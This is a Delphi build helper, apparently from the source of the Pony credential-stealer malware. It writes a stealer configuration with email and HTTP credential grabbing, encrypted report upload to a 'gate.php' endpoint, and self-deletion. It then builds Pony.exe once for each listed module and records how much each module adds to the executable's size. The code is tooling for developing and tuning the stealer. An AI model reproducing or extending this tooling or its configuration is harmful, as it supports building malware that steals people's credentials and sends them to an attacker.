program CalcModuleSize;

{$APPTYPE CONSOLE}

uses
  Windows, Classes, SysUtils;

procedure xCloseFile(var FHandle: THandle);
begin
  if FHandle <> INVALID_HANDLE_VALUE then
    CloseHandle(FHandle);
  FHandle := INVALID_HANDLE_VALUE;
end;

function xOpenFile(var FHandle: THandle; const FileName: String): Boolean;
begin
  Result := False;
  if not FileExists(FileName) then Exit;
  FHandle := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
  if FHandle = INVALID_HANDLE_VALUE then Exit;
  if SetFilePointer(FHandle, 0, nil, 0) = LongWord(-1) then begin
    xCloseFile(FHandle);
    Exit;
  end;
  Result := True;
end;

function xGetFileSize(const FileName: String): LongWord;
var
  FHandle: THandle;
begin
  Result := 0;
  if not xOpenFile(FHandle, FileName) then Exit;
  Result := GetFileSize(FHandle, nil);
  xCloseFile(FHandle);
  if Result = $FFFFFFFF then
    Result := 0;
end;

procedure ExecConsoleApp(CommandLine: AnsiString; Output: TStringList; Errors: TStringList);
var
  sa: TSECURITYATTRIBUTES;
  si: TSTARTUPINFO;
  pi: TPROCESSINFORMATION;
  hPipeOutputRead: THANDLE;
  hPipeOutputWrite: THANDLE;
  hPipeErrorsRead: THANDLE;
  hPipeErrorsWrite: THANDLE;
  Res, bTest: Boolean;
  env: array[0..100] of Char;
  szBuffer: array[0..256] of Char;
  dwNumberOfBytesRead: DWORD;
  Stream: TMemoryStream;
begin
  FillChar(sa, sizeof(sa), 0);
  sa.nLength := sizeof(sa);
  sa.bInheritHandle := true;
  sa.lpSecurityDescriptor := nil;
  CreatePipe(hPipeOutputRead, hPipeOutputWrite, @sa, 0);
  CreatePipe(hPipeErrorsRead, hPipeErrorsWrite, @sa, 0);
  ZeroMemory(@env, SizeOf(env));
  ZeroMemory(@si, SizeOf(si));
  ZeroMemory(@pi, SizeOf(pi));
  si.cb := SizeOf(si);
  si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  si.wShowWindow := SW_HIDE;
  si.hStdInput := 0;
  si.hStdOutput := hPipeOutputWrite;
  si.hStdError := hPipeErrorsWrite;

  (* Remember that if you want to execute an app with no parameters you nil the
     second parameter and use the first, you can also leave it as is with no
     problems.                                                                 *)
  Res := CreateProcess(nil, PChar(CommandLine), nil, nil, true,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, @env, nil, si, pi);

  // Procedure will exit if CreateProcess fail
  if not Res then  begin
    CloseHandle(hPipeOutputRead);
    CloseHandle(hPipeOutputWrite);
    CloseHandle(hPipeErrorsRead);
    CloseHandle(hPipeErrorsWrite);
    Exit;
  end;
  CloseHandle(hPipeOutputWrite);
  CloseHandle(hPipeErrorsWrite);

  //Read output pipe
  Stream := TMemoryStream.Create;
  try
    while true do
    begin
      FillChar(szBuffer, SizeOf(szBuffer), 0);
      bTest := ReadFile(hPipeOutputRead, szBuffer[0], SizeOf(szBuffer)-1, dwNumberOfBytesRead,
        nil);
      if not bTest then
        Break;
      Stream.Write(szBuffer[0], dwNumberOfBytesRead);
    end;
    Stream.Position := 0;
    Output.LoadFromStream(Stream);
  finally
    Stream.Free;
  end;

  //Read error pipe
  Stream := TMemoryStream.Create;
  try
    while true do
    begin
      FillChar(szBuffer, SizeOf(szBuffer), 0);
      bTest := ReadFile(hPipeErrorsRead, szBuffer[0], SizeOf(szBuffer)-1, dwNumberOfBytesRead,
        nil);
      if not bTest then
        Break;
      Stream.Write(szBuffer[0], dwNumberOfBytesRead);
    end;
    Stream.Position := 0;
    Errors.LoadFromStream(Stream);
  finally
    Stream.Free;
  end;

  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(hPipeOutputRead);
  CloseHandle(hPipeErrorsRead);
end;

var
  L, Config, ExecOutput, ExecErr: TStringList;

const
  CConfigFile = 'Config.inc';
  CBuildBatchFile = 'build.bat';
  CResultExeFile = 'Pony.exe';

  CConfig = '; Advanced options' + #13#10 +
            'PACK_REPORT equ 1' + #13#10 +
            'ENCRYPT_REPORT equ 1' + #13#10 +
            'SELF_DELETE equ 1' + #13#10 +
            'SEND_EMPTY_REPORTS equ 1' + #13#10 +
            'UPLOAD_RETRIES equ 2' + #13#10 +
            'GRAB_EMAIL equ 1' + #13#10 +
            'GRAB_HTTP equ 1' + #13#10 +
            'CReportPassword db "XYZ",0' + #13#10 +

            '; Domain list' + #13#10 +
            'szDomainList db "http://localhost/gate.php",0' + #13#10 +
            'db 0' + #13#10;

var
  i: Integer;
  S: String;
  VOut, Dir: String;
  cur_size: Integer;

begin
  L := TStringList.Create;
  Config := TStringList.Create;
  ExecOutput := TStringList.Create;
  ExecErr := TStringList.Create;
  L.LoadFromFile('module_list.txt');

  Dir := GetCurrentDir;
  SetCurrentDir('..\..\');
  Config.Text := CConfig;
  Config.SaveToFile(CConfigFile);
  ExecConsoleApp(CBuildBatchFile + ' align', ExecOutput, ExecErr);
  cur_size := xGetFileSize(CResultExeFile);

  VOut := '';
  for i := 0 to L.Count-1 do begin
    S := Trim(L[i]);
    Config.Text := CConfig + 'COMPILE_' + S + ' equ 1' + #13#10;
    Config.SaveToFile(CConfigFile);
    ExecConsoleApp(CBuildBatchFile + ' align', ExecOutput, ExecErr);
    S := '  ModuleFileSize.Values[''' + S + '''] := ''' + IntToStr(Integer(xGetFileSize(CResultExeFile)) - cur_size) + ''';'#13#10;
    VOut := VOut + S;
    Write(S);
  end;

  DeleteFile(CResultExeFile);

  SetCurrentDir(Dir);
  L.Text := VOut;
  L.SaveToFile('..\ModuleSize.inc');
  L.Free;
  Config.Free;
  ExecOutput.Free;
  ExecErr.Free;

  Writeln('Done!');
end.